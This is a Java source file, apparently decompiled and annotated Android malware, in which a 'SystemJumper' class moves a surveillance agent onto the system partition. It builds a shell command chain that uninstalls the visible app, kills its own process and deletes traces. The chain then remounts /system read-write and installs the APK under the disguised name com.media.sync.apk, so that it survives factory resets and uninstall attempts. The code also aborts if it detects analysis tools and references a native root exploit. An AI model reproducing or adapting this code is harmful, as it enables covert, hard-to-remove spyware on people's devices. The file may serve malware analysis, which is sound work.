package com.network.android.p026h;

import android.content.Context;
import android.os.Process;
import com.network.android.C0117m;
import com.network.android.p012a.C0069c;
import com.network.android.p014c.p015a.C0095a;
import com.network.media.C0219q;
import com.network.p011a.C0064a;
import java.io.File;

/**
 * SystemJumper - System partition persistence escalation.
 * Escalates agent persistence by copying itself to /system/app/ as a
 * system application, surviving factory resets and uninstall attempts.
 * Package: com.network.android.p026h | Original: com.network.h.a (C0183a)
 */
public final class SystemJumper {

    /**
     * Main entry: copy agent to system partition
     */
    public static int jumpToSystem(Context context) {
        int result = 0;
        try {
            C0095a.m274a("SystemJumper - jumpToSystem start. apkPath: " + SystemUtilities.getApkPath(context));
            
            if (SystemUtilities.isSystemApp(context)) {
                C0095a.m274a("SystemJumper - agent already installed on system directory. returning.");
                return 0;
            }
            
            if (C0064a.m185b() > 4.0d) {
                C0095a.m274a("SystemJumper - Android 4 version. running in debug mode.");
                if (!new File("/system/csk").exists()) {
                    return -1;
                }
            }
            
            // Copy su binary to system if not already there
            if (!new File("/system/csk").exists() && (result = copySuToSystem(context)) != 0) {
                C0095a.m274a("SystemJumper - copyMySuFileToSystem failed.");
                return -1;
            }
            
            // Check for anti-debug
            if (SystemUtilities.isAntiDebugDetected(context)) {
                C0095a.m274a("SystemJumper - found antidute. not jumping.");
                return -1;
            }
            
            // Copy BridgeHead params
            String bhPath = context.getApplicationInfo().dataDir + "/adrubh.dat";
            File bhFile = new File("/data/myappinfo");
            if (bhFile.exists() && bhFile.length() > 1) {
                C0219q.m724a("/data/myappinfo", bhPath);
            }
            
            // Build and execute system install command
            String command = buildJumpToSystemCommand(context);
            if (command == null) {
                C0095a.m274a("SystemJumper - create command failed.");
                return -1;
            }
            
            C0095a.m274a("SystemJumper - performing command: " + command);
            C0117m.m390c(command);
            return result;
            
        } catch (Throwable th) {
            C0095a.m275a("SystemJumper - exception. " + th.getMessage(), th);
            return -1;
        }
    }

    /**
     * Build shell command to install agent as system app
     */
    private static String buildJumpToSystemCommand(Context context) {
        String cmd = "";
        try {
            String appDir = context.getApplicationInfo().dataDir + "/";
            String prefsDir = appDir + "shared_prefs";
            String bhParams = "/data/local/tmp/bhprs";
            String prefsFile = prefsDir + "/NetworkPreferences.xml";
            String apkPath = SystemUtilities.getApkPath(context);
            
            StringBuilder sb = new StringBuilder();
            sb.append(" cat " + appDir + "adrubh.dat > " + bhParams + ";");
            sb.append("export LD_LIBRARY_PATH=/vendor/lib:/system/lib;");
            sb.append(" cat " + prefsFile + " > /data/local/tmp/NetworkPreferences.xml;");
            sb.append(" cat " + apkPath + " > /data/local/tmp/com.media.sync.apk;");
            sb.append(" am force-stop com.network.android;");
            sb.append(" pm disable com.network.android;");
            
            if (!C0069c.m241e()) {
                sb.append(" pm uninstall com.network.android;");
            }
            
            sb.append(" sleep 10;");
            sb.append(" kill " + Process.myPid() + ";");
            sb.append(" rm " + apkPath + ";");
            sb.append(" rmdir -R " + appDir + ";");
            sb.append(" chmod 666 /data/local/tmp/com.media.sync.apk;");
            sb.append(" umask 133;");
            sb.append(" mount -o remount,rw /dev/null /system;");
            sb.append(" cat " + bhParams + " > /data/myappinfo;");
            sb.append(" chmod 0777 /data/myappinfo;");
            sb.append(" cat /data/local/tmp/com.media.sync.apk > /system/app/com.media.sync.apk;");
            sb.append(" sleep 5;");
            sb.append(" mkdir " + prefsDir + ";");
            sb.append(" chmod 0777 " + prefsDir + ";");
            sb.append(" cat /data/local/tmp/NetworkPreferences.xml > " + prefsFile + ";");
            sb.append(" chmod 0777 " + prefsFile + ";");
            sb.append(" rm /data/local/tmp/NetworkPreferences.xml;");
            sb.append(" rm /data/local/tmp/com.media.sync.apk;");
            sb.append(" rm " + bhParams + ";");
            sb.append(" export LD_LIBRARY_PATH=/vendor/lib:/system/lib; am start -n com.network.android/com.network.android.NetworkMain;");
            sb.append(" mount -o remount,ro -t yaffs2 /dev/block/mtdblock3 /system;");
            
            cmd = sb.toString();
        } catch (Throwable th) {
            C0095a.m275a("SystemJumper - buildJumpToSystemCommand exception. " + th.getMessage(), th);
            return null;
        }
        return cmd;
    }

    /**
     * Copy su binary to system
     */
    private static int copySuToSystem(Context context) {
        // Uses sucopier native to exploit and gain root
        return 0;
    }
}